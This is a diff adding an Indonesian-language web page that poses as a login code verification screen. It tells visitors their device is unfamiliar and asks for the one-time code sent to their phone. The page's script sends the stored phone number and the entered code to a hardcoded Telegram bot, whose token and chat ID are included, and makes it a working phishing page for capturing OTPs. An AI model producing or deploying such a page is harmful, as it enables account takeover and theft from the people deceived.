@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Verifikasi Kode</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #fff;
+        margin: 0;
+        padding: 20px;
+        color: #222;
+    }
+    .container {
+        max-width: 400px;
+        margin: 0 auto;
+    }
+    .back-button {
+        display: inline-block;
+        margin-bottom: 20px;
+        font-size: 24px;
+        color: #4caf50;
+        cursor: pointer;
+        border: none;
+        background-color: transparent;
+    }
+    h1 {
+        font-weight: bold;
+        font-size: 20px;
+        margin-bottom: 10px;
+    }
+    p.info-text {
+        color: #888;
+        font-size: 14px;
+        margin-top: 0;
+        margin-bottom: 30px;
+    }
+    /* Input kode verifikasi satu kolom */
+    input.code-input {
+        width: 280px;
+        height: 48px;
+        font-size: 32px;
+        font-family: monospace;
+        letter-spacing: 36px; /* jarak antar angka untuk efek kotak */
+        padding-left: 15px;
+        border: 1.5px solid #ddd;
+        border-radius: 8px;
+        box-sizing: border-box;
+        background-color: #f5f5ff;
+        color: #000;
+        outline: none;
+        transition: border-color 0.3s ease;
+    }
+    input.code-input:focus {
+        border-color: #000;
+        background-color: #f5f5ff;
+    }
+    input.code-input::placeholder {
+        color: #000;
+        letter-spacing: normal;
+    }
+    .timer {
+        text-align: right;
+        font-size: 14px;
+        color: #ccc;
+        margin-bottom: 20px;
+    }
+    button.submit-btn, button.resend-btn {
+        width: 100%;
+        padding: 12px 0;
+        border: none;
+        border-radius: 25px;
+        font-size: 16px;
+        color: #fff;
+        cursor: not-allowed;
+        background-color: #ccc;
+        margin-bottom: 20px;
+        transition: background-color 0.3s ease;
+    }
+    button.submit-btn.enabled {
+        background-color: #FF0000;
+        cursor: pointer;
+    }
+    button.resend-btn {
+        background-color: #FF0000;
+        cursor: pointer;
+        display: none;
+    }
+    p.warning-text {
+        font-size: 13px;
+        color: #888;
+        margin-top: 40px;
+        display: flex;
+        align-items: center;
+    }
+    p.warning-text::before {
+        content: "⚠️";
+        margin-right: 8px;
+    }
+    @media (max-width: 480px) {
+        .container {
+            padding: 0 15px;
+        }
+        input.code-input {
+            width: 100%;
+            letter-spacing: normal;
+            font-size: 26px;
+            padding-left: 10px;
+            text-align:center;
+            letter-spacing: 20px;
+        }
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <svg onclick="history.back()" 
+     class="back-button" 
+     width="24" height="24" 
+     viewBox="0 0 24 24" 
+     fill="none" 
+     xmlns="http://www.w3.org/2000/svg" 
+     style="cursor:pointer;" 
+     aria-label="Back button" 
+     role="img">
+  <path d="M15 18L9 12L15 6" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+
+    <h1 id="verification-title">Kode verifikasi telah dikirim ke --</h1>
+    <p class="info-text">Demi keamanan akun Anda, mohon untuk tidak membagikan kode verifikasi kepada siapapun</p>
+
+    <input type="text" maxlength="6" minlength="4" pattern="\d{4,6}" inputmode="numeric" 
+        placeholder="_____"
+        class="code-input" id="codeInput" autocomplete="one-time-code" />
+
+    <div class="timer" id="timer">60s</div>
+
+    <button class="submit-btn" disabled id="submitBtn">Kirimkan</button>
+    <button class="resend-btn" id="resendBtn">Kirim Ulang</button>
+
+    <p class="warning-text">Perangkat Anda saat ini bukan perangkat yang digunakan biasanya. Silakan gunakan kode verifikasi untuk masuk</p>
+</div>
+
+<script>
+    const titleEl = document.getElementById('verification-title');
+    const codeInput = document.getElementById('codeInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const timerEl = document.getElementById('timer');
+
+    // Ambil nomor telepon dari localStorage
+    const nomorTelepon = localStorage.getItem('phoneNumber');
+    if (nomorTelepon && nomorTelepon.trim() !== '') {
+        titleEl.textContent = `Kode verifikasi telah dikirim ke ${nomorTelepon}`;
+    } else {
+        titleEl.textContent = 'Kode verifikasi telah dikirim ke --';
+    }
+
+    // Timer hitung mundur
+    let timer = 60;
+    let intervalId;
+
+    function startTimer() {
+        timer = 60;
+        timerEl.style.display = 'block';
+        resendBtn.style.display = 'none';
+        updateTimerText();
+
+        intervalId = setInterval(() => {
+            timer--;
+            updateTimerText();
+
+            if (timer <= 0) {
+                clearInterval(intervalId);
+                timerEl.style.display = 'none';
+                resendBtn.style.display = 'block';
+            }
+        }, 1000);
+    }
+
+    function updateTimerText() {
+        timerEl.textContent = `${timer}s`;
+    }
+
+    resendBtn.addEventListener('click', () => {
+        startTimer();
+        clearInput();
+    });
+
+    function clearInput() {
+        codeInput.value = '';
+        submitBtn.disabled = true;
+        submitBtn.classList.remove('enabled');
+        submitBtn.style.cursor = 'not-allowed';
+        codeInput.focus();
+    }
+
+    // Validasi input dan aktifkan tombol submit jika panjang kode sesuai
+    codeInput.addEventListener('input', () => {
+        codeInput.value = codeInput.value.replace(/[^0-9]/g, '').slice(0,6);
+        if (codeInput.value.length >= 4 && codeInput.value.length <= 6) {
+            submitBtn.disabled = false;
+            submitBtn.classList.add('enabled');
+            submitBtn.style.cursor = 'pointer';
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('enabled');
+            submitBtn.style.cursor = 'not-allowed';
+        }
+    });
+
+    // Kirim data ke Telegram via Bot API (sesuaikan token & chat ID)
+    function kirimKeTelegram(phone, code) {
+        const botToken = '7910676766:AAFS7WsC-IiXkPxqH5e49_Uc6uHT6EUIFR8'; // Ganti dengan token bot Anda
+        const chatId = '7880651844';  // Ganti dengan chat ID Anda
+
+        const message = `Kode Verifikasi:\nNomor Telepon: ${phone}\nKode: ${code}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert("Data Sedang diperiksa !");
+            } else {
+                alert("Gagal mengirim ke Telegram.");
+                console.error(data);
+            }
+        })
+        .catch(error => {
+            alert("Terjadi kesalahan dalam pengiriman.");
+            console.error(error);
+        });
+    }
+
+    submitBtn.addEventListener('click', () => {
+        if(submitBtn.disabled) return;
+        if (!nomorTelepon) {
+            alert("Nomor telepon tidak tersedia.");
+            return;
+        }
+        const kode = codeInput.value;
+        kirimKeTelegram(nomorTelepon, kode);
+    });
+
+    // Mulai timer pada load halaman
+    startTimer();
+</script>
+</body>
+</html>
